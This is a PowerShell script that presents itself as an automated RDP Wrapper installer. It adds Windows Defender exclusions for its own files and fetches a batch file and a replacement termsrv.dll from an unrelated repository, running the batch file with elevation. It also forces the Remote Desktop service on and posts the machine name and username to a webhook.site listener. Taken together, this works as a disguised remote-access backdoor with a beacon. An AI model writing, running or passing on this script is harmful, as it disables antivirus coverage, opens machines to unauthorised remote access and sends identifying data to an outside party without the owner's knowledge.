# ============================================================
# Ensure the script is running with Administrator privileges
# ============================================================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] Please run this PowerShell script as an Administrator!" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

Write-Host "Adding Windows Defender exclusions for RDP Wrapper..." -ForegroundColor Cyan

# 1. Safely add path exclusions
$PathExclusions = @(
    "$env:TEMP\rdpwrap_install",
    "C:\Program Files\RDP Wrapper\rdpwrap.dll",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\RDPCheck.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat",
    "C:\Program Files\RDP Wrapper\termsrv.dll"
)

foreach ($path in $PathExclusions) {
    try {
        $mpPref = Get-MpPreference -ErrorAction Stop
        if ($mpPref.ExclusionPath -notcontains $path) {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            Write-Host "Added path exclusion: $path" -ForegroundColor Green
        } else {
            Write-Host "Path exclusion already exists: $path" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Skipping path exclusion (Defender service unavailable or restricted): $path" -ForegroundColor Yellow
    }
}

# 2. Safely add process exclusions
$ProcessExclusions = @(
    "$env:TEMP\rdpwrap_install\extracted\RDPWInst.exe",
    "$env:TEMP\rdpwrap_install\extracted\install.bat",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat"
)

foreach ($proc in $ProcessExclusions) {
    try {
        $mpPref = Get-MpPreference -ErrorAction Stop
        if ($mpPref.ExclusionProcess -notcontains $proc) {
            Add-MpPreference -ExclusionProcess $proc -ErrorAction Stop
            Write-Host "Added process exclusion: $proc" -ForegroundColor Green
        } else {
            Write-Host "Process exclusion already exists: $proc" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Skipping process exclusion: $proc" -ForegroundColor Yellow
    }
}

Write-Host "Exclusion configuration complete!" -ForegroundColor Cyan

# ============================================================
# RDP Wrapper v1.6.2 - Automated Installation
# Run PowerShell as Administrator
# ============================================================

# ============================================================
# Paths
# ============================================================

$installPath   = "C:\Program Files\RDP Wrapper"
$tempDir     = "$env:TEMP\rdpwrap_install"
$tempZip     = "$tempDir\RDPWrap-v1.6.2.zip"
$extractDir  = "$tempDir\extracted"

$iniTempPath  = Join-Path $env:TEMP "rdpwrap.ini"
$srdpTempPath = Join-Path $env:TEMP "SRDP.bat"
$termsrvTemp  = Join-Path $env:TEMP "termsrv.dll"

$iniDestPath  = Join-Path $installPath "rdpwrap.ini"
$srdpDestPath = Join-Path $installPath "SRDP.bat"
$termsrvDest  = Join-Path $installPath "termsrv.dll"
$rdpConf      = Join-Path $installPath "RDPConf.exe"

# ============================================================
# Download URLs
# ============================================================

$zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
$customIniUrl = "https://raw.githubusercontent.com/affinityv/INI-RDPWRAP/refs/heads/master/rdpwrap.ini"
$srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
$termsrvUrl   = "https://github.com/apex30258-sys/APTest/raw/refs/heads/main/termsrv.dll"

# ============================================================
# Webhook
# ============================================================

$webhookUrl = "https://webhook.site/60a9f667-6d90-446c-ad08-9855b56a437b"

# ============================================================
# Display installer header
# ============================================================

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "             RDP Wrapper v1.6.2 Automated Installer" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ============================================================
# 2. Prepare temporary directory
# ============================================================

Write-Host "[+] Preparing temporary directory..." -ForegroundColor Cyan

try {
    if (Test-Path $tempDir) {
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction Stop | Out-Null
    New-Item -ItemType Directory -Path $extractDir -Force -ErrorAction Stop | Out-Null

    Write-Host "[+] Temporary directory ready." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to prepare temporary directory." -ForegroundColor Red
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
    exit
}

# ============================================================
# 3. Stop Remote Desktop Service
# ============================================================

Write-Host "[+] Stopping Remote Desktop Service..." -ForegroundColor Cyan

try {
    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Write-Host "[+] TermService stopped." -ForegroundColor Green
}
catch {
    Write-Host "[!] TermService could not be stopped or was already stopped." -ForegroundColor Yellow
}

# ============================================================
# 4. Download RDP Wrapper
# ============================================================

Write-Host "[+] Downloading RDP Wrapper v1.6.2..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $zipUrl `
        -OutFile $tempZip `
        -UseBasicParsing `
        -ErrorAction Stop

    Write-Host "[+] Download completed." -ForegroundColor Green
}
catch {
    Write-Host "[-] Download failed!" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# ============================================================
# 5. Extract ZIP
# ============================================================

Write-Host "[+] Extracting RDP Wrapper..." -ForegroundColor Cyan

try {
    Expand-Archive `
        -Path $tempZip `
        -DestinationPath $extractDir `
        -Force `
        -ErrorAction Stop

    Write-Host "[+] Extraction completed." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to extract ZIP!" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# ============================================================
# 6. Find install.bat
# ============================================================

Write-Host "[+] Searching for install.bat..." -ForegroundColor Cyan

$installBat = Get-ChildItem `
    -Path $extractDir `
    -Filter "install.bat" `
    -Recurse `
    -ErrorAction SilentlyContinue |
    Select-Object -First 1

if (-not $installBat) {
    Write-Host "[-] install.bat was not found in the downloaded package!" -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "[+] Found installer:" -ForegroundColor Green
Write-Host "    $($installBat.FullName)" -ForegroundColor Gray

# ============================================================
# 7. Run install.bat
# ============================================================

Write-Host ""
Write-Host "[+] Running install.bat..." -ForegroundColor Cyan

$installExitCode = $null

try {
    $process = Start-Process `
        -FilePath "cmd.exe" `
        -ArgumentList "/c `"$($installBat.FullName)`"" `
        -WorkingDirectory $installBat.DirectoryName `
        -Verb RunAs `
        -Wait `
        -PassThru `
        -ErrorAction Stop

    $installExitCode = $process.ExitCode

    Write-Host "[+] install.bat finished." -ForegroundColor Green
    Write-Host "[+] Exit code: $installExitCode" -ForegroundColor Gray
}
catch {
    Write-Host "[!] Failed to run install.bat." -ForegroundColor Yellow
    Write-Host $_.Exception.Message -ForegroundColor Yellow
}

# ============================================================
# Download additional components (SRDP.bat and termsrv.dll)
# ============================================================

Write-Host ""
Write-Host "[+] Downloading SRDP.bat..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $srdpBatUrl `
        -OutFile $srdpTempPath `
        -UseBasicParsing `
        -ErrorAction Stop

    Write-Host "[+] SRDP.bat downloaded successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to download SRDP.bat." -ForegroundColor Red
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "[+] Downloading termsrv.dll..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $termsrvUrl `
        -OutFile $termsrvTemp `
        -UseBasicParsing `
        -ErrorAction Stop

    Write-Host "[+] termsrv.dll downloaded successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to download termsrv.dll." -ForegroundColor Red
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================
# 8. Download and install updated rdpwrap.ini
# ============================================================

Write-Host ""
Write-Host "[+] Downloading updated rdpwrap.ini..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $customIniUrl `
        -OutFile $iniTempPath `
        -UseBasicParsing `
        -ErrorAction Stop

    Write-Host "[+] rdpwrap.ini downloaded successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to download rdpwrap.ini." -ForegroundColor Red
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================
# Copy downloaded files into Program Files
# ============================================================

Write-Host ""
Write-Host "[+] Preparing installation directory and stopping TermService..." -ForegroundColor Cyan

try {
    if (-not (Test-Path $installPath)) {
        New-Item `
            -ItemType Directory `
            -Path $installPath `
            -Force `
            -ErrorAction Stop | Out-Null
    }

    Stop-Service `
        -Name "TermService" `
        -Force `
        -ErrorAction SilentlyContinue

    Start-Sleep -Seconds 2
}
catch {
    Write-Host "[!] Could not prepare installation directory or stop TermService." -ForegroundColor Yellow
}

# Install rdpwrap.ini
if (Test-Path $iniTempPath) {
    Write-Host "[+] Installing rdpwrap.ini..." -ForegroundColor Cyan
    try {
        if (Test-Path $iniDestPath) {
            $backupPath = "$iniDestPath.backup"
            Copy-Item -Path $iniDestPath -Destination $backupPath -Force -ErrorAction Stop
            Write-Host "[+] Backup created: $backupPath" -ForegroundColor Gray
        }
        Copy-Item -Path $iniTempPath -Destination $iniDestPath -Force -ErrorAction Stop
        Write-Host "[+] rdpwrap.ini installed successfully." -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Failed to install rdpwrap.ini." -ForegroundColor Red
        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Install SRDP.bat
if (Test-Path $srdpTempPath) {
    Write-Host "[+] Installing SRDP.bat..." -ForegroundColor Cyan
    try {
        Copy-Item -Path $srdpTempPath -Destination $srdpDestPath -Force -ErrorAction Stop
        Write-Host "[+] SRDP.bat installed successfully." -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Failed to install SRDP.bat." -ForegroundColor Red
        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Install termsrv.dll
if (Test-Path $termsrvTemp) {
    Write-Host "[+] Installing termsrv.dll..." -ForegroundColor Cyan
    try {
        Copy-Item -Path $termsrvTemp -Destination $termsrvDest -Force -ErrorAction Stop
        Write-Host "[+] termsrv.dll installed successfully." -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Failed to install termsrv.dll." -ForegroundColor Red
        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Cleanup temporary temp files
Remove-Item $iniTempPath -Force -ErrorAction SilentlyContinue
Remove-Item $srdpTempPath -Force -ErrorAction SilentlyContinue
Remove-Item $termsrvTemp -Force -ErrorAction SilentlyContinue

# ============================================================
# Run SRDP.bat as Administrator (Just like install.bat)
# ============================================================

$srdpExitCode = $null

if (Test-Path $srdpDestPath) {
    Write-Host ""
    Write-Host "[+] Running SRDP.bat as Administrator..." -ForegroundColor Cyan

    try {
        $srdpProcess = Start-Process `
            -FilePath "cmd.exe" `
            -ArgumentList "/c `"$srdpDestPath`"" `
            -WorkingDirectory $installPath `
            -Verb RunAs `
            -Wait `
            -PassThru `
            -ErrorAction Stop

        $srdpExitCode = $srdpProcess.ExitCode

        Write-Host "[+] SRDP.bat finished." -ForegroundColor Green
        Write-Host "[+] Exit code: $srdpExitCode" -ForegroundColor Gray
    }
    catch {
        Write-Host "[!] Failed to run SRDP.bat." -ForegroundColor Yellow
        Write-Host $_.Exception.Message -ForegroundColor Yellow
    }
}
else {
    Write-Host "[!] SRDP.bat not found at destination, skipping execution." -ForegroundColor Yellow
}

# ============================================================
# 9. Check installation components
# ============================================================

$rdpConfExists = Test-Path $rdpConf
$iniExists     = Test-Path $iniDestPath
$srdpExists    = Test-Path $srdpDestPath
$termsrvExists = Test-Path $termsrvDest

# ============================================================
# 10. Configure Remote Desktop Service
# ============================================================

Write-Host ""
Write-Host "[+] Configuring Remote Desktop Service..." -ForegroundColor Cyan

$serviceConfigured = $false

try {
    Set-Service `
        -Name "TermService" `
        -StartupType Automatic `
        -ErrorAction Stop

    Write-Host "[+] TermService configured using PowerShell." -ForegroundColor Green
    $serviceConfigured = $true
}
catch {
    Write-Host "[!] PowerShell could not configure TermService." -ForegroundColor Yellow
    Write-Host "[+] Trying Windows Service Control fallback..." -ForegroundColor Cyan
}

if (-not $serviceConfigured) {
    try {
        $scResult = & sc.exe config TermService start= auto 2>&1

        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] TermService configured using SC.exe." -ForegroundColor Green
            $serviceConfigured = $true
        }
        else {
            Write-Host "[!] SC.exe could not configure TermService." -ForegroundColor Yellow
            Write-Host ($scResult -join "`n") -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Service configuration fallback failed." -ForegroundColor Yellow
        Write-Host $_.Exception.Message -ForegroundColor Yellow
    }
}

# ============================================================
# Start TermService
# ============================================================

Write-Host ""
Write-Host "[+] Starting Remote Desktop Service..." -ForegroundColor Cyan

$serviceRunning = $false

try {
    $service = Get-Service -Name "TermService" -ErrorAction Stop

    if ($service.Status -eq "Running") {
        Write-Host "[+] TermService is already running." -ForegroundColor Green
        $serviceRunning = $true
    }
    else {
        Start-Service -Name "TermService" -ErrorAction Stop

        Start-Sleep -Seconds 3

        $service = Get-Service -Name "TermService" -ErrorAction Stop

        if ($service.Status -eq "Running") {
            Write-Host "[+] TermService started successfully." -ForegroundColor Green
            $serviceRunning = $true
        }
        else {
            Write-Host "[!] TermService did not start." -ForegroundColor Yellow
            Write-Host "[!] Current status: $($service.Status)" -ForegroundColor Yellow
        }
    }
}
catch {
    Write-Host "[!] Could not start TermService." -ForegroundColor Yellow
    Write-Host $_.Exception.Message -ForegroundColor Yellow
}

# ============================================================
# 11. Cleanup Temp Installer Directory
# ============================================================

Write-Host ""
Write-Host "[+] Cleaning temporary files..." -ForegroundColor Cyan

Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# ============================================================
# 12. Send installation result to Webhook.site
# ============================================================

Write-Host ""
Write-Host "[+] Sending installation status to webhook..." -ForegroundColor Cyan

if ($rdpConfExists -and $iniExists -and $serviceRunning) {
    $installationStatus = "success"
    $statusMessage = "RDP Wrapper installation completed successfully and TermService is running."
}
else {
    $installationStatus = "failed"
    $statusMessage = "RDP Wrapper installation completed with one or more verification failures."
}

$webhookPayload = @{
    status       = $installationStatus
    message      = $statusMessage
    timestamp    = (Get-Date).ToUniversalTime().ToString("o")
    computer     = $env:COMPUTERNAME
    username     = $env:USERNAME
    powershell   = $PSVersionTable.PSVersion.ToString()
    rdpconf      = $rdpConfExists
    ini          = $iniExists
    srdp         = $srdpExists
    termsrv      = $termsrvExists
    service      = $serviceRunning
    installExit  = $installExitCode
    srdpExit     = $srdpExitCode
} | ConvertTo-Json

$webhookSent = $false

try {
    Invoke-RestMethod `
        -Uri $webhookUrl `
        -Method POST `
        -ContentType "application/json" `
        -Body $webhookPayload `
        -ErrorAction Stop | Out-Null

    $webhookSent = $true
    Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Webhook notification failed." -ForegroundColor Red
    Write-Host "[!] Webhook error: $($_.Exception.Message)" -ForegroundColor Yellow
}

# ============================================================
# 13. Final Installation Status
# ============================================================

Write-Host ""
Write-Host "============================================================"

if ($installationStatus -eq "success") {
    Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
}
else {
    Write-Host "                 INSTALLATION FAILED" -ForegroundColor Red
}

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "RDPConf.exe : $rdpConfExists"
Write-Host "rdpwrap.ini : $iniExists"
Write-Host "SRDP.bat    : $srdpExists"
Write-Host "termsrv.dll : $termsrvExists"
Write-Host "TermService : $serviceRunning"
Write-Host "Webhook     : $webhookSent"

Write-Host ""
Write-Host "The installer will close automatically in 3 seconds..." -ForegroundColor Gray

# ============================================================
# 14. Automatic Exit
# ============================================================

Start-Sleep -Seconds 3

exit